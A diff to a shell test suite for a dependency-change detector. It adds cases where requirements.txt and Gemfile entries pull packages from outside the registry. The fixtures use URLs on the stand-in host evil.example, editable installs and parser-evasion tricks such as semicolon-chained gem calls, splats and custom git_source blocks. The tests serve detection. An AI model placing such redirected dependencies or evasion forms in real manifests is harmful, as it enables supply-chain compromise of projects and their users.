@@ -53,6 +53,18 @@
 #      or #$gvar is reported as a literal target; or a single-quoted string,
 #      which Ruby does not interpolate, is refused as if it did; or a # inside
 #      a backtick command is read as a comment, cutting off its git block's do
+#   R18 a requirements.txt line that is only a URL (git+https://...#egg=x, a
+#      wheel URL) or a local path, or an -e editable install, is skipped, so
+#      the package it installs from outside the index is neither added nor
+#      a redirect and the run says STATE=ok; or one that names no package is
+#      skipped instead of making the file unreadable; or `-e .`, the project
+#      itself, is refused as a URL with no name
+#   R19 a second gem call after a ; on a gem line is dropped, and its git:
+#      option is read as the first gem's
+#   R20 a gem source option keyed by a string ("git" => url, "git": url) is
+#      read as the version "git", so the gem reads as from the registry
+#   R21 a source option passed through a **splat or a hash variable, or a
+#      custom git_source option (mine: "r"), reads as a gem from the registry
 
 { [ -n "${REPO_ROOT:-}" ] && declare -F _flow_assert_fail >/dev/null \
     && source "$REPO_ROOT/plugins/flow/tests/lib/e2e.sh"; } || {
@@ -394,3 +406,84 @@ _dep dep-gem-word-in-string "the word gem inside a string or in gemspec is not a
 $'gem "rails", "7.0.0"\n' \
 $'gem "rails", "7.0.0"\ngemspec\nputs "install the gem rack"\n' \
 'STATE=ok'
+
+# --- requirements.txt URL, path and editable lines (R18) ----------------------
+_dep dep-req-url-lines "a VCS URL with #egg= and a wheel URL are added and are redirects (R18)" requirements.txt \
+$'flask==2.0\n' \
+$'flask==2.0\ngit+https://evil.example/requests2.git#egg=requests2\nhttps://files.example/pkgs/Fastjson-1.0-py3-none-any.whl ; python_version>"3.8"\n' \
+'STATE=ok
+DEP_ADDED=fastjson@(unpinned) manifest=requirements.txt:3
+DEP_ADDED=requests2@(unpinned) manifest=requirements.txt:2
+DEP_REPLACED=fastjson -> https://files.example/pkgs/Fastjson-1.0-py3-none-any.whl@(unpinned) manifest=requirements.txt:3
+DEP_REPLACED=requests2 -> git+https://evil.example/requests2.git#egg=requests2@(unpinned) manifest=requirements.txt:2'
+
+_dep dep-req-editable "editable installs and a local wheel are redirects; -e . is the project itself (R18)" requirements.txt \
+$'flask==2.0\n-e .\n' \
+$'flask==2.0\n-e .\n-e ../localpkg#egg=localpkg\n--editable=git+https://evil.example/x.git#egg=xpkg\n./wheels/zz-2.0-py3-none-any.whl\n-r other.txt\n' \
+'STATE=ok
+DEP_ADDED=localpkg@(unpinned) manifest=requirements.txt:3
+DEP_ADDED=xpkg@(unpinned) manifest=requirements.txt:4
+DEP_ADDED=zz@(unpinned) manifest=requirements.txt:5
+DEP_REPLACED=localpkg -> ../localpkg#egg=localpkg@(unpinned) manifest=requirements.txt:3
+DEP_REPLACED=xpkg -> git+https://evil.example/x.git#egg=xpkg@(unpinned) manifest=requirements.txt:4
+DEP_REPLACED=zz -> ./wheels/zz-2.0-py3-none-any.whl@(unpinned) manifest=requirements.txt:5'
+
+_dep dep-req-editable-no-name "an editable path that names no package makes the file unreadable (R18)" requirements.txt \
+$'flask==2.0\n' \
+$'flask==2.0\n-e ../localpkg\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=requirements.txt reason=the requirement on line 2 is a URL or path that names no package (no egg fragment and no wheel file name) at head'
+
+_dep dep-req-url-no-name "a URL to an sdist names no package and makes the file unreadable (R18)" requirements.txt \
+$'flask==2.0\n' \
+$'flask==2.0\nhttps://files.example/pkgs/fast-json-1.0.tar.gz\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=requirements.txt reason=the requirement on line 2 is a URL or path that names no package (no egg fragment and no wheel file name) at head'
+
+# --- Gemfile forms that read as a gem from the registry (R19-R21) ------------
+_dep dep-gem-semicolon "a second gem call after a ; on a gem line makes the file unreadable (R19)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"; gem "evil", git: "https://evil.example/evil.git"\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=Gemfile reason=the gem call on line 1 is followed by another statement after a ; at head'
+
+_dep dep-gem-semicolon-trailing "a ; that ends a gem line, or sits in a string, is not a second statement (R19)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0";\ngem "rack", git: "https://evil.example/r;ack"\n' \
+'STATE=ok
+DEP_ADDED=rack@(unpinned) manifest=Gemfile:2
+DEP_REPLACED=rack -> https://evil.example/r;ack@(unpinned) manifest=Gemfile:2'
+
+_dep dep-gem-string-key "a source option keyed by a string is a redirect, not a version (R20)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"\ngem "rack", "git" => "https://evil.example/rack"\ngem "rake", "13.0", "github": "evil/rake", \'branch\' => "main"\n' \
+'STATE=ok
+DEP_ADDED=rack@(unpinned) manifest=Gemfile:2
+DEP_ADDED=rake@13.0 manifest=Gemfile:3
+DEP_REPLACED=rack -> https://evil.example/rack@(unpinned) manifest=Gemfile:2
+DEP_REPLACED=rake -> github:evil/rake@main manifest=Gemfile:3'
+
+_dep dep-gem-double-splat "options passed through a **splat make the file unreadable (R21)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"\nopts = { git: "https://evil.example/rack" }\ngem "rack", **opts\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=Gemfile reason=the gem call on line 3 passes arguments through a splat at head'
+
+_dep dep-gem-hash-variable "a gem argument that is a variable makes the file unreadable (R21)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"\ngem "rack", RACK_OPTS\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=Gemfile reason=the gem call on line 2 passes an argument that is not a string literal or an option at head'
+
+_dep dep-gem-git-source "a custom git_source option is a redirect (R21)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"\ngit_source(:mine) { |repo| "https://evil.example/#{repo}.git" }\ngem "rack", mine: "rack", tag: "v1"\n' \
+'STATE=ok
+DEP_ADDED=rack@(unpinned) manifest=Gemfile:3
+DEP_REPLACED=rack -> mine:rack@v1 manifest=Gemfile:3'
+
+_dep dep-gem-git-source-unnamed "a git_source whose name is not a literal makes the file unreadable (R21)" Gemfile \
+$'gem "rails", "7.0.0"\n' \
+$'gem "rails", "7.0.0"\ngit_source(SOURCE_NAME) { |repo| "https://evil.example/#{repo}.git" }\n' \
+'STATE=unavailable
+MANIFEST_UNPARSED=Gemfile reason=the git_source on line 2 does not name a literal symbol or string at head'
